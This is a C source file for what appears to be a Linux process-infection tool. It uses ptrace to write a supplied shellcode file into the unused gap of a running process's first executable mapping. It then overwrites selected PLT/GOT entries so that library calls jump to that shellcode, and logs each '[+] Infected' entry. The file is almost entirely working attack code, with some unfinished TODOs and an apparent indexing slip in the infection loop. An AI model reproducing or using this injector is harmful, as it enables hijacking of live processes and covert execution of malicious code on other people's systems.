#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <error.h>
#include <errno.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/fcntl.h>
#include <unistd.h>
#include <sys/ptrace.h>

#include <elf.h>

#include "memory_map_parser.h"
#include "parse_remote_elf.h"

// TODO: Refactor this.
static const char *g_shellcode;
static size_t g_shellcodesize;

static void *xmalloc(size_t size) {
	void *res = malloc(size);
	if(!res) error(-1, errno, "malloc()");
	return res;
}

static int map_shellcode(const char *shellcode_path) {
	struct stat statbuf;
	
	int fd = open(shellcode_path, O_RDONLY);
	if(fd == -1) return 0;
	if(fstat(fd, &statbuf) == -1) {
		close(fd);
		return 0;
	}
	printf("--%s %ld\n", shellcode_path, statbuf.st_size);
	void *a = mmap(NULL, (size_t)statbuf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	printf("%p\n", a);
	
	if(a == MAP_FAILED)  { close(fd); return 0; }
	g_shellcode = (char*) a;
	g_shellcodesize = (size_t)statbuf.st_size;
	
	close(fd);
	return 1;
}

/* 
 * IMPORTANT: size must be a multiple of the word size.
 * */
int WriteProcessMemory(int pid, void *base_address, 
							const void *buffer, size_t size) 
{
	#define _WORD_SIZE (sizeof(long)) // ptrace() returns a word in a long.
	size_t sb, remaining;
	long *raddr, *laddr;
	
	raddr = (long *) base_address;
	laddr = (long *) buffer;

	sb = size / _WORD_SIZE;			

	for(size_t i = 0; i < sb; i++) {
		long res = ptrace(PTRACE_POKETEXT, pid, (void *) raddr, (void*) *laddr);
		if(res == -1) return 0;
		raddr += 1;
		laddr += 1;
	}
		
	return 1;		
	#undef _WORD_SIZE
}

/* Given the base address of an object/module (ex. libc...), it injects 
 * the shellcode into an appropriate gap within target and returns the address of the shellcode.
 * If the object has already been infected the address of the already present shellcode is returned.
 * 
 * If the gap is not big enough for the shellcode this function fails.
 * 
 * This algorithm can be improved and be made more reliable.
 * */
static void *inject_shellcode(TARGET *target, void *base_address) {
	//memory_region_t *regions = target->maps.regions;
	//uint32_t num_regions = target->maps.num_regions;
	
	/* The shellcode will be injected in the gap at the end of the first executable
	 * region, which is expected to be the first mapped region, corresponding to the first
	 * program header.
	 * */
	memory_region_t *region = &target->maps.regions[0];
	if(region->shellcode_address) return region->shellcode_address;
	
	// Find first loadable program header.
	Elf64_Ehdr *header = &target->header;
	Elf64_Phdr *pheader = target->pheader;
	Elf64_Phdr *firstload = NULL;
	for(int i=0; i<header->e_phnum; i++) {
		Elf64_Phdr *ph = &pheader[i];
		if(ph->p_type == PT_LOAD || ph->p_type == PT_DYNAMIC) {
			firstload = ph;
			break;
		}
	}
	if(!firstload) return NULL;
	
	// Find gap address and size
	// TODO: CHECK OFF BY ONE
	size_t regionsize = ((size_t)region->end_address - (size_t)region->start_address)+1;
	size_t gapsize = regionsize - firstload->p_memsz;
	if(gapsize < g_shellcodesize) return NULL;
	void *gap_address = (void*)((size_t)region->start_address + firstload->p_memsz);
	
	// copy the shellcode into taarget
	fprintf(stderr, "[DEBUG] Injecting shellcode into gap %p (gapsize %lu bytes)\n", gap_address, gapsize);
	int res = WriteProcessMemory(target->pid, gap_address, g_shellcode, g_shellcodesize);
	if(!res){
		fprintf(stderr, "[DEBUG] Cannot inject shellcode into %p\n", base_address);
		return NULL;
	}
	
	region->shellcode_address = gap_address;
	return gap_address;
}

static int infect_entry(TARGET *target, size_t index) {
	
	pltgot_entry_t *entries = target->pltgot_entries;
	size_t numentries = (target->plt_gotsz/sizeof(Elf64_Addr))-3;
	if(index >= numentries || entries[index].is_infected) return 1;
	pltgot_entry_t *entry = &entries[index];
		
	void *shellcode_address = inject_shellcode(target, entry->module_base);
	if(!shellcode_address) return 0;
	// TODO: GIVE SHELLCODE AN ADDRESS TO RETURN TO.
	//WriteProcessMemory(...);
	
	// overwrite pltgot entry with shellcode_address.
	int res = WriteProcessMemory(target->pid, entry->slot_address, &shellcode_address, sizeof(shellcode_address));
	
	return res;
}

// TODO: Make infect() return error code or something...
void infect(pid_t pid, size_t list[], size_t list_size, char *shellcode_path) {
	TARGET target;
	
	if(!target_init(&target, pid))
		error(2, errno, "target_init");
		
	// map shellcode into memory.
	if(!map_shellcode(shellcode_path)) {
		fprintf(stderr, "[-] Cannot map shellcode into memory. Invalid path?\n");
		return;
	}
	
	if(!target_parse_remote_elf(&target))
		error(3, errno, "target_parse_remote_elf");
			
	for(size_t k=0; k<list_size; k++) {
		size_t i = list[k];
		//... TODO: CHECK INDEX HERE.
		
		if(!infect_entry(&target, list[i])) {
			fprintf(stderr, "[-] Cannot infect #%lu %s@%s\n", i, 
				target.pltgot_entries[i].symname, target.pltgot_entries[i].module);
		} else {
			fprintf(stderr, "[+] Infected #%lu %s@%s\n", i, 
				target.pltgot_entries[i].symname, target.pltgot_entries[i].module);
		}
	}
}
